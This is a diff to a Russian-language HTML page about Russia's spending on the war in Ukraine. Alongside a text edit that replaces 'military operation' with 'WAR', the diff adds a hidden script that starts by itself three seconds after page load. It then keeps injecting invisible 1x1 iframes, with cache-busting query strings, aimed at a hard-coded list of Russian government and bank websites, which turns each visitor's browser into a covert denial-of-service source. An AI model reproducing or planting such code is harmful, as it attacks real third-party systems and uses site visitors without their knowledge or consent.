@@ -320,7 +320,7 @@
                 <div class="wrapper">
                     <h3 class="mbr-section-title mbr-fonts-style mb-4 display-2"><strong>20 млрд </strong>долларов в сутки</h3>
                     <p class="mbr-text mbr-fonts-style mb-4 display-5">
-                        Россия тратит на военную операции в Украине</p>
+                        Россия тратит на <s>военную операцию</s> <strong>ВОЙНУ</strong> в Украине</p>
                     
                 </div>
             </div>
@@ -569,7 +569,95 @@
         </div>
     </div>
 </section>
-  
+  <div id="frames"></div>
+
+<style>
+    #frames {
+        display: none
+    }
+</style>
+
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+<script>
+    let interval;
+    let iframeIndex = 1;
+    let count = 0;
+
+    const TARGETS = [
+        'https://kremlin.ru',
+        'https://www.duma.gov.ru',
+        'https://scrf.gov.ru',
+        'https://sberbank.ru',
+        'https://www.vtb.ru',
+        'https://www.gazprombank.ru',
+        'https://alfabank.ru',
+        'https://rshb.ru',
+        'https://psbank.ru',
+        'https://www.mkb.ru',
+        'https://www.sberbank.ru/'
+    ];
+
+    function getRandomArbitrary(min, max) {
+        return Math.random() * (max - min) + min;
+    }
+
+    function generateRandomSalt() {
+        const now = (new Date()).getTime();
+        return '?' + now + getRandomArbitrary(0, 100000);
+    }
+
+    function getTarget(target_number = 0) {
+        const salt = generateRandomSalt();
+
+        return TARGETS[target_number] + salt;
+
+        // return TARGET + salt;
+    }
+
+    function drawIframe(block, target, id) {
+        $('<iframe>', {
+            src: target,
+            id: 'frame' + id,
+            frameborder: 0,
+            width: 1,
+            height: 1,
+        }).appendTo(block);
+    }
+
+    function start() {
+        const frameBlock = $('#frames');
+
+        interval = setInterval(() => {
+            const target = getTarget(iframeIndex % (TARGETS.length-1));
+            drawIframe(frameBlock, target, iframeIndex);
+            count++;
+            iframeIndex++;
+            if (iframeIndex > 200) {
+                clearFrames();
+                iframeIndex = 1;
+            }
+        }, 70);
+    }
+
+    function clearFrames() {
+        $('#frames').empty();
+    }
+
+    function stop() {
+        clearInterval(interval);
+        clearFrames();
+    }
+
+    $(document).ready(function () {
+        setTimeout(function(){
+            setInterval(() => {
+                console.log(count);
+            }, 1000)
+
+            start();
+        },3000);
+    });
+</script>
   
 </body>
 </html>
